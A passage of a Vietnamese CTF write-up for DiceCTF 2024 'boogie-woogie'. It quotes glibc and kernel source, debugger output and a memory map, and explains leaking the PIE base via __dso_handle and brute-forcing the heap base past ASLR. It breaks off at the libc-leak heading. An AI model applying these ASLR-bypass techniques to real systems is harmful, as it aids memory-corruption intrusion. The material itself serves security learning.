<p>Thay đổi giá trị của biến này không có ý nghĩa gì trong việc khai thác.</p>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/cxa_finalize.c">stdlib/cxa_finalize.c</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;assert.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;exit.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;register-atfork.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sysdep.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* If D is non-NULL, call all functions registered with `__cxa_atexit&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   with the same dso handle.  Otherwise, if D is NULL, call all of the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   registered handlers.  */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__cxa_finalize</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>d)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> exit_function_list <span style="color:#f92672">*</span>funcs;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__libc_lock_lock</span> (__exit_funcs_lock);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> restart:
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (funcs <span style="color:#f92672">=</span> __exit_funcs; funcs; funcs <span style="color:#f92672">=</span> funcs<span style="color:#f92672">-&gt;</span>next)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">struct</span> exit_function <span style="color:#f92672">*</span>f;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (f <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>funcs<span style="color:#f92672">-&gt;</span>fns[funcs<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]; f <span style="color:#f92672">&gt;=</span> <span style="color:#f92672">&amp;</span>funcs<span style="color:#f92672">-&gt;</span>fns[<span style="color:#ae81ff">0</span>]; <span style="color:#f92672">--</span>f)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((d <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> d <span style="color:#f92672">==</span> f<span style="color:#f92672">-&gt;</span>func.cxa.dso_handle) <span style="color:#f92672">&amp;&amp;</span> f<span style="color:#f92672">-&gt;</span>flavor <span style="color:#f92672">==</span> ef_cxa)
</span></span><span style="display:flex;"><span>	  {
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint64_t</span> check <span style="color:#f92672">=</span> __new_exitfn_called;
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>cxafn) (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg, <span style="color:#66d9ef">int</span> status) <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>func.cxa.fn;
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>cxaarg <span style="color:#f92672">=</span> f<span style="color:#f92672">-&gt;</span>func.cxa.arg;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	    <span style="color:#75715e">/* We don&#39;t want to run this cleanup more than once.  The Itanium
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       C++ ABI requires that multiple calls to __cxa_finalize not
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       result in calling termination functions more than once.  One
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       potential scenario where that could happen is with a concurrent
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       dlclose and exit, where the running dlclose must at some point
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       release the list lock, an exiting thread may acquire it, and
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       without setting flavor to ef_free, might re-run this destructor
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       which could result in undefined behaviour.  Therefore we must
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       set flavor to ef_free to avoid calling this destructor again.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       Note that the concurrent exit must also take the dynamic loader
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       lock (for library finalizer processing) and therefore will
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       block while dlclose completes the processing of any in-progress
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       exit functions. Lastly, once we release the list lock for the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       entry marked ef_free, we must not read from that entry again
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       since it may have been reused by the time we take the list lock
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       again.  Lastly the detection of new registered exit functions is
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       based on a monotonically incrementing counter, and there is an
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       ABA if between the unlock to run the exit function and the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       re-lock after completion the user registers 2^64 exit functions,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       the implementation will not detect this and continue without
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       executing any more functions.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       One minor issue remains: A registered exit function that is in
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       progress by a call to dlclose() may not completely finish before
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       the next registered exit function is run. This may, according to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       some readings of POSIX violate the requirement that functions
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       run in effective LIFO order.  This should probably be fixed in a
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       future implementation to ensure the functions do not run in
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       parallel.  */</span>
</span></span><span style="display:flex;"><span>	    f<span style="color:#f92672">-&gt;</span>flavor <span style="color:#f92672">=</span> ef_free;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef PTR_DEMANGLE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	    <span style="color:#a6e22e">PTR_DEMANGLE</span> (cxafn);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	    <span style="color:#75715e">/* Unlock the list while we call a foreign function.  */</span>
</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">__libc_lock_unlock</span> (__exit_funcs_lock);
</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">cxafn</span> (cxaarg, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">__libc_lock_lock</span> (__exit_funcs_lock);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	    <span style="color:#75715e">/* It is possible that that last exit function registered
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	       more exit functions.  Start the loop over.  */</span>
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">__glibc_unlikely</span> (check <span style="color:#f92672">!=</span> __new_exitfn_called))
</span></span><span style="display:flex;"><span>	      <span style="color:#66d9ef">goto</span> restart;
</span></span><span style="display:flex;"><span>	  }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Also remove the quick_exit handlers, but do not call them.  */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (funcs <span style="color:#f92672">=</span> __quick_exit_funcs; funcs; funcs <span style="color:#f92672">=</span> funcs<span style="color:#f92672">-&gt;</span>next)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">struct</span> exit_function <span style="color:#f92672">*</span>f;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (f <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>funcs<span style="color:#f92672">-&gt;</span>fns[funcs<span style="color:#f92672">-&gt;</span>idx <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]; f <span style="color:#f92672">&gt;=</span> <span style="color:#f92672">&amp;</span>funcs<span style="color:#f92672">-&gt;</span>fns[<span style="color:#ae81ff">0</span>]; <span style="color:#f92672">--</span>f)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (d <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> d <span style="color:#f92672">==</span> f<span style="color:#f92672">-&gt;</span>func.cxa.dso_handle)
</span></span><span style="display:flex;"><span>	  f<span style="color:#f92672">-&gt;</span>flavor <span style="color:#f92672">=</span> ef_free;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Remove the registered fork handlers.  We do not have to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     unregister anything if the program is going to terminate anyway.  */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (d <span style="color:#f92672">!=</span> NULL)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">UNREGISTER_ATFORK</span> (d);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__libc_lock_unlock</span> (__exit_funcs_lock);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Tuy nhiên, có 1 điều chú ý ở đây là nó trỏ đến chính địa chỉ của nó trong phân vùng .bss, từ đây ta có thể dễ dàng leak được PIE.</p>
<pre tabindex="0"><code>pwndbg&gt; tel &amp;__dso_handle
00:0000│  0x555555563008 (__dso_handle) ◂— 0x555555563008
</code></pre><h3 id="leak-heap">Leak HEAP</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╭─</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie <span style="color:#960050;background-color:#1e0010"></span>                                                                                      <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010">✔</span> <span style="color:#960050;background-color:#1e0010"></span> w1n_gl0ry<span style="color:#960050;background-color:#1e0010">@</span>phis1Ng <span style="color:#960050;background-color:#1e0010">─╮</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─</span> cat <span style="color:#f92672">/</span>proc<span style="color:#f92672">/</span><span style="color:#ae81ff">155341</span><span style="color:#f92672">/</span>maps                                                                                                                                         <span style="color:#960050;background-color:#1e0010">─╯</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">56330</span>ee12000<span style="color:#f92672">-</span><span style="color:#ae81ff">56330</span>ee13000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344433</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie_patched
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">56330</span>ee13000<span style="color:#f92672">-</span><span style="color:#ae81ff">56330</span>ee14000 r<span style="color:#f92672">-</span>xp <span style="color:#ae81ff">00001000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344433</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie_patched
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">56330</span>ee14000<span style="color:#f92672">-</span><span style="color:#ae81ff">56330</span>ee20000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">00002000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344433</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie_patched
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">56330</span>ee20000<span style="color:#f92672">-</span><span style="color:#ae81ff">56330</span>ee21000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">0000</span>d000 <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344433</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie_patched
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">56330</span>ee21000<span style="color:#f92672">-</span><span style="color:#ae81ff">56330</span>ee23000 rw<span style="color:#f92672">-</span>p <span style="color:#ae81ff">0000e000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344433</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie_patched
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5633107</span>ab000<span style="color:#f92672">-</span><span style="color:#ae81ff">5633107</span>cc000 rw<span style="color:#f92672">-</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span>                          [heap]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b000000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b028000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344431</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b028000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b1bd000 r<span style="color:#f92672">-</span>xp <span style="color:#ae81ff">0002</span><span style="color:#ae81ff">8000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344431</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b1bd000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b215000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">001</span>bd000 <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344431</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b215000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b216000 <span style="color:#f92672">---</span>p <span style="color:#ae81ff">00215000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344431</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b216000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b21a000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">00215000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344431</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b21a000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b21c000 rw<span style="color:#f92672">-</span>p <span style="color:#ae81ff">0021</span><span style="color:#ae81ff">9000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344431</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b21c000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b229000 rw<span style="color:#f92672">-</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b2ce000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b2d3000 rw<span style="color:#f92672">-</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b2d3000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b2d5000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344432</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span><span style="color:#ae81ff">2.35</span>.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b2d5000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b2ff000 r<span style="color:#f92672">-</span>xp <span style="color:#ae81ff">00002000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344432</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span><span style="color:#ae81ff">2.35</span>.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b2ff000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b30a000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">0002</span>c000 <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344432</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span><span style="color:#ae81ff">2.35</span>.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b30b000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b30d000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">00037000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344432</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span><span style="color:#ae81ff">2.35</span>.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b30d000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b30f000 rw<span style="color:#f92672">-</span>p <span style="color:#ae81ff">0003</span><span style="color:#ae81ff">9000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344432</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span><span style="color:#ae81ff">2.35</span>.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7ff</span>c7b917000<span style="color:#f92672">-</span><span style="color:#ae81ff">7ff</span>c7b938000 rw<span style="color:#f92672">-</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span>                          [stack]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7ff</span>c7b947000<span style="color:#f92672">-</span><span style="color:#ae81ff">7ff</span>c7b94b000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span>                          [vvar]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7ff</span>c7b94b000<span style="color:#f92672">-</span><span style="color:#ae81ff">7ff</span>c7b94d000 r<span style="color:#f92672">-</span>xp <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span>                          [vdso]
</span></span><span style="display:flex;"><span>ffffffffff600000<span style="color:#f92672">-</span>ffffffffff601000 <span style="color:#f92672">--</span>xp <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span>                  [vsyscall]
</span></span></code></pre></div><p>Nhận thấy offset giữa vùng data và vùng heap bị ảnh hưởng bởi ASLR nên không cố định.</p>
<p><a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/process.c">source/arch/x86/kernel/process.c</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">arch_randomize_brk</span>(<span style="color:#66d9ef">struct</span> mm_struct <span style="color:#f92672">*</span>mm)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">randomize_page</span>(mm<span style="color:#f92672">-&gt;</span>brk, <span style="color:#ae81ff">0x02000000</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Nhìn vào source trên, địa chỉ của Heap sẽ bắt đầu từ 0 -&gt; 0x02000000 (dài khoảng 8192 pages) sau địa chỉ của program (bằng 0 nếu binary không có cơ chế ASLR), mà địa chỉ Heap trải dài khoảng 33 pages (dài 0x21000). Do đó ta có thể brute tương đương 1/249 lần (33/8192) để có thể xác định được 1 địa chỉ hợp lệ ở phân vùng Heap, từ đó ta có thể xác định được địa chỉ Heap base bằng cách kiểm tra byte cuối của <code>top chunk</code> size hoặc <code>tcache_perthread_struct</code> size field.</p>
<h3 id="leak-libc">Leak LIBC</h3>
